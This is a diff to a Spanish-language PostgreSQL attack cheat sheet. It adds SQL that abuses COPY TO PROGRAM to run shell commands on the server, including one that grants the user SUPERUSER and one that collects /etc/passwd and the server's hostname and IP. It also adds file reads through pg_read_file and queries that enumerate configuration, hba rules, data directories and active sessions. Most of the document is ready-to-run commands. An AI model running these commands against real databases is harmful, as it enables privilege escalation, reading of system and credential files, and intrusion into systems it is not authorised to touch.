@@ -3,6 +3,8 @@
 
 ### Ejecutar bash con el comando copy y obtener información valiosa del servidor 
 ```
+COPY (select '') to PROGRAM 'psql -U postgres -c "ALTER USER <your_username> WITH SUPERUSER;"';
+
 COPY ( select '' ) TO PROGRAM 'cat > /tmp/data.txt && cat /etc/passwd >> /tmp/data.txt  && echo $(hostname -I ) - $(hostname) >> /tmp/data.txt &&  paste -s -d, - < /tmp/data.txt  > /tmp/test2.txt';
 
 --- El contenido del passwd se te mostrara en la primera linea que dice "ERROR:  invalid input syntax for type bigint:"
@@ -27,10 +29,14 @@ select current_database();
 FUNCIONES
 
 -- Manipulacion de ficheros 
-pg_read_file
+--- Leee un archivo de texto
+select pg_read_file('/etc/hostname')
 pg_write_file
 copy
 pgcrypto
+
+-- Busca funciones del sistema que te permite manipular el sistema
+\df *pg_re*
 
 -- ejecutar comandos de manera remota 
 dblink
@@ -115,6 +121,28 @@ SELECT current_setting('is_superuser');
 
 
 SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants WHERE table_name='pg_shadow';
+
+
+
+SHOW logging_collector;
+SHOW password_encryption;
+SHOW shared_preload_libraries;
+SHOW hba_file;
+SHOW data_directory;
+
+SELECT boot_val,reset_val FROM pg_settings WHERE name='listen_addresses';
+SELECT boot_val,reset_val FROM pg_settings WHERE name='data_directory';
+SELECT boot_val,reset_val FROM pg_settings WHERE name='log_directory';
+
+SELECT boot_val,reset_val FROM pg_settings WHERE name='port';
+SELECT inet_server_addr();
+SELECT current_timestamp; 
+
+select * from from pg_hba_file_rules;
+Select * from  pg_stat_activity    ;
+
+
+
 ```
 
 
